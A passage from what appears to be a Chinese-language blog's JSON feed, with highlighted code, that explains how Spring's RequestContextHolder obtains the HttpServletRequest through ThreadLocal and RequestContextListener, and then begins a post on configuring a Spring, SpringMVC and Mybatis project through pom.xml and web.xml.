function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">getRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">HttpServletRequest</span> <span class=\"token function\">getRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">getRequestAttributes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">ServletRequestAttributes</span> <span class=\"token function\">getRequestAttributes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token class-name\">RequestAttributes</span> attributes <span class=\"token operator\">=</span> <span class=\"token class-name\">RequestContextHolder</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRequestAttributes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletRequestAttributes</span><span class=\"token punctuation\">)</span> attributes<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可以看到，最后是通过一个 <code>RequestContextHolder</code> ，将获取到的 <code>RequestAttributes</code>  强转为 <code>ServletRequestAttributes</code> ，接着调用 <code>getRequest</code>  方法。</p>\n<p>从字面意思来看， <code>ServletRequestAttributes</code>  是 <code>Servlet</code>  请求属性，为什么能拿到 <code>HttpServletRequest</code>  对象呢？源码上对该类的描述是：</p>\n<blockquote>\n<p>Servlet-based implementation of the RequestAttributes interface.</p>\n</blockquote>\n<blockquote>\n<p>Accesses objects from servlet request and HTTP session scope, with no distinction between &quot;session&quot; and &quot;global session&quot;.</p>\n</blockquote>\n<p>大意就是基于 Servlet 的 RequestAttributes 接口的实现。</p>\n<p>从 servlet 请求和 HTTP 会话范围访问对象，至于为啥给了一个方法返回 <code>HttpServletRequest</code> ，大概也没什么特别的原因，只是接下来的实现类要用，所以就返回了一个封装好的 <code>HttpServletRequest</code>  吧，</p>\n<p>接着看 <code>RequestContextHolder</code> ，</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">RequestContextHolder</span>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">ThreadLocal</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">RequestAttributes</span><span class=\"token punctuation\">></span></span> requestAttributesHolder <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">new</span> <span class=\"token class-name\">NamedThreadLocal</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Request attributes\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">final</span> <span class=\"token class-name\">ThreadLocal</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">RequestAttributes</span><span class=\"token punctuation\">></span></span> inheritableRequestAttributesHolder <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">new</span> <span class=\"token class-name\">NamedInheritableThreadLocal</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Request context\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token annotation punctuation\">@Nullable</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">RequestAttributes</span> <span class=\"token function\">getRequestAttributes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token class-name\">RequestAttributes</span> attributes <span class=\"token operator\">=</span> requestAttributesHolder<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>attributes <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            attributes <span class=\"token operator\">=</span> inheritableRequestAttributesHolder<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">return</span> attributes<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>发现其内部维护了两个 ThreadLocal 变量，可以看到虽然都是 <code>ThreadLocal</code> ，但是一个多了个 <code>Inheritable</code> ， <code>NamedInheritableThreadLocal</code>  继承了 <code>InheritableThreadLocal</code> ，该类主要是用于子线程创建时，需要自动继承父线程的 <code>ThreadLocal</code>  变量。</p>\n<p>然后通过 <code>getRequestAttributes</code>  返回 <code>RequestAttributes</code> ，那么有 get 就有 set，需要找到它是在什么时候被添加进去的。通过查找引用，发现在 <code>RequestContextListener</code>  中调用过 <code>setRequestAttributes</code> 。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">RequestContextListener</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">ServletRequestListener</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">requestInitialized</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletRequestEvent</span> requestEvent<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>requestEvent<span class=\"token punctuation\">.</span><span class=\"token function\">getServletRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">HttpServletRequest</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IllegalArgumentException</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                    <span class=\"token string\">\"Request is not an HttpServletRequest: \"</span> <span class=\"token operator\">+</span> requestEvent<span class=\"token punctuation\">.</span><span class=\"token function\">getServletRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token class-name\">HttpServletRequest</span> request <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span><span class=\"token punctuation\">)</span> requestEvent<span class=\"token punctuation\">.</span><span class=\"token function\">getServletRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token class-name\">ServletRequestAttributes</span> attributes <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ServletRequestAttributes</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        request<span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token constant\">REQUEST_ATTRIBUTES_ATTRIBUTE</span><span class=\"token punctuation\">,</span> attributes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token class-name\">LocaleContextHolder</span><span class=\"token punctuation\">.</span><span class=\"token function\">setLocale</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span><span class=\"token function\">getLocale</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token class-name\">RequestContextHolder</span><span class=\"token punctuation\">.</span><span class=\"token function\">setRequestAttributes</span><span class=\"token punctuation\">(</span>attributes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>该类实现了 <code>ServletRequestListener</code>  接口，源码中的描述是：</p>\n<blockquote>\n<p>A ServletRequestListener can be implemented by the developer interested in being notified of requests coming in and out of scope in a web component. A request is defined as coming into scope when it is about to enter the first servlet or filter in each web application, as going out of scope when it exits the last servlet or the first filter in the chain.</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">interface</span> <span class=\"token class-name\">ServletRequestListener</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">EventListener</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>     * The request is about to go out of scope of the web application.</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>     * The default implementation is a NO-OP.</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>     * @param sre Information about the request</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>     */</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">default</span> <span class=\"token keyword\">void</span> requestDestroyed <span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletRequestEvent</span> sre<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>     * The request is about to come into scope of the web application.</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>     * The default implementation is a NO-OP.</pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>     * @param sre Information about the request</pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>     */</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">default</span> <span class=\"token keyword\">void</span> requestInitialized <span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletRequestEvent</span> sre<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>Web 应用中，当一个请求进入第一个 Servlet 或者 Filter 时，就会触发 <code>requestInitialized</code> ，当退出链中的最后一个 Servlet 或者第一个 Filter 时，会触发 <code>requestDestroyed</code> 。 <code>RequestContextListener</code>  重写了 <code>requestInitialized</code>  方法，通过 <code>ServletRequestEvent</code>  拿到了 <code>HttpServletRequest</code> ，并创建 <code>ServletRequestAttributes</code> ，添加到 <code>ThreadLocal</code>  中。</p>\n",
            "tags": [
                "笔记",
                "源码"
            ]
        },
        {
            "id": "https://a1oyss.github.io/%E7%AC%94%E8%AE%B0/SSM%E6%A1%86%E6%9E%B6%E6%95%B4%E5%90%88%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E5%8A%A0%E8%BD%BD%E5%8E%9F%E7%90%86%E7%9A%84%E6%80%9D%E8%80%83/",
            "url": "https://a1oyss.github.io/%E7%AC%94%E8%AE%B0/SSM%E6%A1%86%E6%9E%B6%E6%95%B4%E5%90%88%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E5%8A%A0%E8%BD%BD%E5%8E%9F%E7%90%86%E7%9A%84%E6%80%9D%E8%80%83/",
            "title": "SSM框架整合过程以及加载原理的思考",
            "date_published": "2022-11-28T12:02:18.000Z",
            "content_html": "<p>#Spring #SpringMVC #Mybatis #源码</p>\n<h1 id=\"添加sringspringmvc相关依赖\"><a class=\"anchor\" href=\"#添加sringspringmvc相关依赖\">#</a> 添加 Sring+SpringMVC 相关依赖</h1>\n<p>因为使用的 maven，web 容器使用的 tomcat，所以先在 pom.xml 中加上：</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>packaging</span><span class=\"token punctuation\">></span></span>war<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>packaging</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>这样项目就会自动将依赖放进 WEB-INF 下面的 lib 中，否则会出现一系列 NoClassFound 等错误。</p>\n<p>添加 spring-webmvc 依赖：</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>org.springframework<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>spring-webmvc<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>$&#123;spring.version&#125;<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">&lt;!-- 方便查看源码 --></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>javax.servlet<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>javax.servlet-api<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>4.0.1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>只添加一个 spring-webmvc 就够了</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2658344/1649995273228-2e36f9bc-538f-4064-8d88-ed7576b1c6ef.png#averageHue=%233a4147&amp;clientId=ue7018ef1-4828-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=186&amp;id=u22de6707&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=233&amp;originWidth=662&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=49187&amp;status=done&amp;style=none&amp;taskId=u0eef87b8-2910-4822-8f66-8be5a43415f&amp;title=&amp;width=529.6\" alt=\"image.png\" /></p>\n<p>可以看到已经将相关依赖全部加载进去了。</p>\n<p>这里有一个问题，@Contoller 和 @GetMapping 等注解是在 spring-web 中，然而只有这两个注解，不去配置 DispatcherServlet 是不会处理请求的，也就是说如果只导入 spring-web 依赖，而没有 spring-webmvc，即使有 @Controller，也只是个普通的注解。</p>\n<h1 id=\"配置spring\"><a class=\"anchor\" href=\"#配置spring\">#</a> 配置 spring</h1>\n<p>在 web.xml 中配置</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>listener</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>listener-class</span><span class=\"token punctuation\">></span></span>org.springframework.web.context.ContextLoaderListener<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>listener-class</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>listener</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">&lt;!-- 采用注解方式配置 --></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>context-param</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>param-name</span><span class=\"token punctuation\">></span></span>contextClass<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>param-name</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>param-value</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token comment\">&lt;!-- 使用注解实现类 --></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    org.springframework.web.context.support.AnnotationConfigWebApplicationContext</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>param-value</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>context-param</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>context-param</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>param-name</span><span class=\"token punctuation\">></span></span>contextConfigLocation<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>param-name</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token comment\">&lt;!-- 配置类 --></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>param-value</span><span class=\"token punctuation\">></span></span>com.sk.day31.config.ApplicationConfig<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>param-value</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>context-param</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>ContextLoaderListener 实现了 ServletContextListener 接口，ServletContextListener 在文档中的解释是</p>\n<blockquote>\n<p>该接口的实现可以接收关于它们所处的 Web 应用程序的 Servlet 上下文变化的通知。为了接收通知事件，必须在 Web 应用程序的部署描述符中配置该实现类。</p>\n</blockquote>\n<p>ServletContextListener 是 Java EE 标准接口之一，类似 Jetty，Tomcat，JBoss 等 java 容器启动时便会触发该接口的 contextInitialized。</p>\n<h2 id=\"spring加载流程\"><a class=\"anchor\" href=\"#spring加载流程\">#</a> spring 加载流程</h2>\n<ol>\n<li>在 Web 容器启动后，触发 ContextLoaderListener，contextInitialized 方法被调用，接着调用 initWebApplicationContext 方法，并将 ServletContext 当作参数传入</li>\n</ol>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">contextInitialized</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletContextEvent</span> event<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">initWebApplicationContext</span><span class=\"token punctuation\">(</span>event<span class=\"token punctuation\">.</span><span class=\"token function\">getServletContext</span><span class=\"token punctuation\">(</span><span class=\"token 